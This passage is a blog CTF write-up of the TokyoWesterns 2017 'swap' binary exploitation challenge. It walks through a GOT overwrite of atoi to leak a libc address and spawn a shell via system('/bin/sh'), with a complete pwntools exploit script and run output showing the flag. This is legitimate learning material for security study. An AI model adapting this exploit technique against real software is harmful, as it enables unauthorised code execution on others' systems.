<p>The next thing to do is to overwrite <code>atoi</code> function and why we want to do it? Because if we overwrite <code>atoi</code> into <code>puts_plt</code> we can leak addresses easily, because we first read them and then print them!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">result = <span class="built_in">puts</span>(&amp;buf);</div></pre></td></tr></table></figure>
<p>Now that we overwrite <code>atoi</code> with <code>puts</code> we can start trying to leak libc addresses like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) <span class="comment"># ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340</span></div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div></pre></td></tr></table></figure>
<p>Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; attach 6865</div><div class="line">...outputfrompwngdb...</div><div class="line">pwndbg&gt; <span class="built_in">continue</span></div><div class="line">pwndbg&gt; p system</div><div class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;</div><div class="line"></div><div class="line">---------------runing-program-in-another-terminal---------------</div><div class="line">$ python swap.py</div><div class="line">..hidden-output...</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice: </div><div class="line"></div><div class="line">STACK ADDRESS 0x7fcb7816a642</div></pre></td></tr></table></figure>
<p>Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print hex(0x7fcb7816a642 - 0x7fcb77dea391)"</span></div><div class="line"><span class="number">0x3802b1</span></div></pre></td></tr></table></figure>
<p>Adapting the python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div></pre></td></tr></table></figure>
<p>We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int i = puts(&apos;\x00&apos;) // returns 1</div><div class="line">int i = puts(&apos;B\x00&apos;) // returns 2</div></pre></td></tr></table></figure>
<p>Now we give the input ‘B\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\x00” string to get ourselves a shell!:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">r.send(<span class="string">'a\x00'</span>) <span class="comment"># returns option 2 from puts</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM)) <span class="comment"># overwrites atoi -&gt; puts -&gt; system</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># passes argument /bin/sh into system</span></div></pre></td></tr></table></figure>
<p>The full script is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">(local)</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./swap'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn1.chal.ctf.westerns.tokyo'</span>, <span class="number">19937</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(s)</span>:</span></div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	r.sendline(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">	send(str(address1))</div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">	send(str(address2))</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'2'</span>)</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div><div class="line"></div><div class="line">r = getConn(local)</div><div class="line">swap(MEMCOPYGOT,READGOT)</div><div class="line">swap(<span class="number">0</span>,ATOIGOT)</div><div class="line">r.send(p64(PUTSPLT))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line"></div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line"></div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">r.send(<span class="string">'a\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM))</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ python swap.py</div><div class="line">[*] <span class="string">'~/swap'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'~/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">...hidden-output...</div><div class="line">STACK ADDRESS 0x7fe5d8827642</div><div class="line">[*] LIBC 0x7fe5d8462001</div><div class="line">[*] SYSTEM 0x7fe5d84a7391</div><div class="line">...hidden-output...</div><div class="line">$ cat flag</div><div class="line">TWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125;</div></pre></td></tr></table></figure>
<p>I didn’t solve this challenge in the CTF tournament I actually read this write ups(<a href="https://ctftime.org/writeup/7387" target="_blank" rel="external">https://ctftime.org/writeup/7387</a> and <a href="https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py" target="_blank" rel="external">https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py</a>) and did the challenge by myself after that.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;The swapping is interesting. Let’s try!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 19937&lt;br&gt;swap&lt;br&gt;libc.so.6&lt;br&gt;&lt;/blockquote&gt;


    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="swapaddresses" scheme="https://teamrocketist.github.io/tags/swapaddresses/"/>
    
  </entry>
  
</feed>
